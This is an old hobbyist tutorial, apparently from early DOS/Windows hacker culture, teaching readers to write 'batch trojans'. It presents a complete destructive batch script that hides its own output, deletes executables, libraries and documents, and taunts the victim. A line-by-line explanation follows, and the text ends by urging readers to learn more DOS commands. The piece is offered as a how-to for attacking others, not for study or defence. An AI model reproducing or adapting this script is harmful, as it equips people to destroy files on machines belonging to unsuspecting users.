HOW TO WRITE BATCH TROJANS
==========================


INTRODUCTION
============


Writing batch trojans is the easiest thing to do and they are able to run 
just on any
PC with Windows or DOS. Batch files are basically just unformatted text 
files with the
extension .bat that use DOS commands such as DEL, COPY, FORMAT, ECHO, MKDIR 
and so on.
Batch trojans are Batch files that use destructive commands that can delete 
other files
or Rename them, display messages, Make directories, and Create other files.


WRITING BATCH TROJANS
=====================


To write a batch trojan, run notepad or some other word processor and type 
this as
follows:

@Echo off
Del *.exe
Del *.com
Del *.dll
Del *.doc
Echo Your Screwed !
Mkdir C:\Screwed!


after typed that, click on File then click on Save, Make sure the part where 
it says
"Save as type:" is on "All Files (*.*)" and then in the "File name:" section 
type "Example.bat"

Now your wandering what does that do ! Here it is again with a explanation:

@Echo off - Turns echo off so user doesn't know what happens
Del *.exe - Deletes all files in the current directory with the .exe 
extension
Del *.com - Deletes all files in the current directory with the .com 
extension
Del *.dll - Deletes all files in the current directory with the .dll 
extension
Del *.doc - Deletes all files in the current directory with the .doc 
extension
Echo Your Screwed ! - Displays Your Screwed !
Mkdir C:\Screwed! - Creates the directory Screwed on the C: drive

There is a bunch more commands you can use and they can be found in a MS-DOS 
manual or
in the DOS prompt by typing "Help" if your in MS-DOS 6.0 or lower. Scimming 
through the
MS-DOS manual can help you learn more commands !
